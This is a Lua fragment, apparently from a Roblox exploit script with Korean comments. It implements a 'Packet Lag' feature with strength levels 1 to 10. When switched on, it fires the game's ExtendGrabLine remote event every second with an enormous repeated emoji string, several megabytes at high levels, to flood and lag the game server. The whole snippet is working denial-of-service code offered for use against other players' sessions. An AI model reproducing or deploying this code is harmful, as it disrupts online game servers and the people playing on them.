-- Packet Lag (SetNetworkOwner 패킷 폭격) 강도 1~10
-- =============================================
local packetEnabled = false
local packetPower = 5        -- 1~10 단계 (10 = 6250)
local packetToken = 0

local function StopPacketLag()
    packetToken = packetToken + 1
end

-- 참고 허브 방식: 1초마다 ExtendGrabLine 으로 이모지 큰 문자열 1개를 서버로 전송
-- 크기 = 이모지 8개 x 100 x 강도.  레벨 n -> 강도 n x 625 (레벨 10 = 6250)
local function StartPacketLag()
    StopPacketLag()
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local grabEvents = ReplicatedStorage:FindFirstChild("GrabEvents")
    local ExtendGrabLine = grabEvents and grabEvents:FindFirstChild("ExtendGrabLine")
    if not ExtendGrabLine then
        warn("Could not find the ExtendGrabLine remote!")
        return
    end
    local myToken = packetToken
    if getgenv()._8minNotify then
        getgenv()._8minNotify(string.format("%.2f MB per second", (32 * 100 * packetPower * 625) / (1024 * 1024)), "Packet Lag ON", "info")
    end
    task.spawn(function()
        while packetEnabled and packetToken == myToken do
            task.wait(1)
            if not (packetEnabled and packetToken == myToken) then break end
            local strength = packetPower * 625
            pcall(function()
                ExtendGrabLine:FireServer(string.rep("😂😂😂😂🤣🤣🤣🤣", 100 * strength))
            end)
        end
    end)
end

